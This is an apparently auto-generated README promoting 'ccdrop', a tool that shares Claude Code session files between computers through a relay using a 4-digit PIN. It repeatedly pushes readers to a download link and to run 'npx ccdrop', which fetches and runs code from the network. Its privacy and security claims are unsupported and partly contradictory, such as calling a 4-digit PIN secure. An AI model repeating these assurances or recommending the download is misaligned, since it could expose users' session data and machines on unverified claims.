# ⚡ ccdrop - Share Claude Code Sessions Instantly

[![Download ccdrop](https://img.shields.io/badge/Download-ccdrop-blue?style=for-the-badge&logo=github)](https://github.com/Nativistic-elixir71/ccdrop)

## 👋 What Is ccdrop?

ccdrop is a lightning-fast tool that lets you share your Claude Code chat sessions between computers using a simple 4-digit PIN. Think of it like a secure, temporary bridge between your devices - no accounts needed, no logs kept, and everything is deleted automatically after download. It runs entirely in memory (RAM) for maximum privacy and speed.

If you use Claude Code on multiple computers or want to share a session with a colleague, ccdrop makes it effortless. You type a few commands, get a PIN, and the session is available on the other computer for a short time. Once downloaded, it's gone forever from the relay.

## 🎯 Who Should Use ccdrop?

ccdrop is perfect for:

- Developers using Claude Code on different machines
- Teams collaborating on AI-assisted coding projects
- Anyone who wants quick, private session transfers without cloud storage
- Users who value privacy and don't want their data lingering on servers

Even if you're not a programmer, if you use Claude Code for generating text, analyzing data, or any other AI task, ccdrop can help you move sessions between computers.

## 🚀 Getting Started

Getting started with ccdrop is simple. You'll use a tool called npx, which comes with Node.js. Here's what you need to do:

**Step 1: Install Node.js**

First, you need Node.js on your computer. Visit the official Node.js website, download the LTS version, and install it. The installation is straightforward - just follow the prompts.

**Step 2: Open Your Command Line**

On Windows, you can open Command Prompt or PowerShell. Press the Windows key, type "cmd" or "powershell", and press Enter.

**Step 3: Get ccdrop**

To use ccdrop, you'll type a command that downloads and runs it automatically. The command is:

`npx ccdrop`

This will fetch the latest version and launch ccdrop. You'll see a welcome message with instructions.

## 📥 Download and Installation

To download and install ccdrop, visit this link to download the application:

**[Download ccdrop](https://github.com/Nativistic-elixir71/ccdrop)**

This will take you to the official GitHub repository where you can find the latest release. You can also use the npx command mentioned above to run ccdrop directly without a separate download.

## 🔧 How to Use ccdrop

### Sending a Session

1. After running `npx ccdrop`, select the "Send" option.
2. ccdrop will ask you to specify the Claude Code session you want to share. This is usually a file or a path to your session data.
3. You'll receive a 4-digit PIN code. Share this PIN with the person or computer that needs the session.
4. The session stays available for a limited time (usually a few minutes) until it's downloaded or expires.

### Receiving a Session

1. On the other computer, run `npx ccdrop`.
2. Select the "Receive" option.
3. Enter the 4-digit PIN code provided by the sender.
4. ccdrop will automatically download the session to your current location.
5. Once downloaded, the session is deleted from the relay immediately.

### Important Notes

- The PIN is valid only for a short period, so share it promptly.
- Only one download is possible per PIN. After that, the session is destroyed.
- Everything is encrypted in transit, and nothing is stored on disk on the relay server.

## ⚠️ Troubleshooting Common Issues

**Issue: "npx is not recognized as an internal or external command"**

This means Node.js isn't installed or not in your system path. Reinstall Node.js, making sure to check the box that adds it to your PATH.

**Issue: The PIN expired before I could use it**

PINs are temporary by design. Just create a new session on the sending computer and share the new PIN.

**Issue: Download failed or was interrupted**

Try again with a fresh PIN. If problems persist, check your internet connection and try again.

**Issue: I can't find the downloaded session**

By default, the session is downloaded to the folder where you run the npx command. Check your current directory.

## 🔒 Privacy and Security

ccdrop is built with privacy as its top priority:

- **RAM-Only Relay**: The relay server keeps sessions only in memory, never on disk.
- **Auto-Delete**: Sessions are automatically deleted after download or timeout.
- **No Accounts**: You don't need to create an account or provide any personal information.
- **No Logs**: The relay keeps no records of transfers.
- **Encryption**: Data is encrypted during transit.

This means your Claude Code sessions are never stored long-term anywhere. Once a session is shared and downloaded, it's completely erased from the relay.

## 🤔 Frequently Asked Questions

**Is ccdrop free?**

Yes, ccdrop is completely free to use. It's an open-source project.

**Do I need to install anything besides Node.js?**

No, npx will handle fetching ccdrop automatically. You just need Node.js installed.

**Can I send multiple sessions at once?**

Currently, ccdrop handles one session at a time. You can run multiple instances if needed.

**How long does a PIN stay valid?**

The validity period is intentionally short, typically around 5-10 minutes. This ensures security and prevents stale data.

**Can I use ccdrop on Mac or Linux?**

Yes, ccdrop works on any system that can run Node.js, including Windows, macOS, and Linux.

## 📊 Technical Details

- **Platform**: Node.js, so it runs anywhere Node.js runs
- **Package**: Available as an npm package (npx ccdrop)
- **Deployment**: Uses a serverless relay (Vercel)
- **Method**: RAM-only data handling with automatic expiration

## 🛠️ For Developers

If you're a developer looking to contribute or learn more:

- The repository URL: https://github.com/Nativistic-elixir71/ccdrop
- The project uses modern JavaScript with Node.js runtime
- It's designed to be lightweight and dependency-minimal
- The relay logic is simple and focused on ephemerality

## 💡 Tips and Best Practices

1. **Use strong PINs**: Even though the PIN is 4 digits, sharing it securely (e.g., through a private message) is important.
2. **Share immediately**: Send the PIN as soon as you receive it to avoid expiration.
3. **Close sessions afterwards**: After downloading, make sure to close ccdrop to free up resources.
4. **Use in trusted environments**: While the relay is secure, only share sessions you're comfortable with.

## 🎉 Final Words

ccdrop is a remarkable tool that solves a real problem: quick, private, and effortless transfer of Claude Code sessions between computers. No account setup, no file hosting, no complex configurations. Just run a command, share a PIN, and you're done.

Whether you're a developer juggling multiple machines or someone who wants to move their AI chat sessions securely, ccdrop delivers what it promises - fast, private, and ephemeral sharing.

Give it a try with just a few commands. Your Claude Code sessions have never been easier to move around!

---

**[Visit the ccdrop GitHub Repository](https://github.com/Nativistic-elixir71/ccdrop)** to download and start sharing today.

Remember: `npx ccdrop` - that's all it takes.

Keywords: ai-coding-assistant, ai-tools, anthropic, chat-share, claude, claude-ai, claude-code, cli, cli-tool, cross-computer, developer-tools, ephemeral, nodejs, npm-package, npx, pin-code, privacy, serverless, session-share, vercel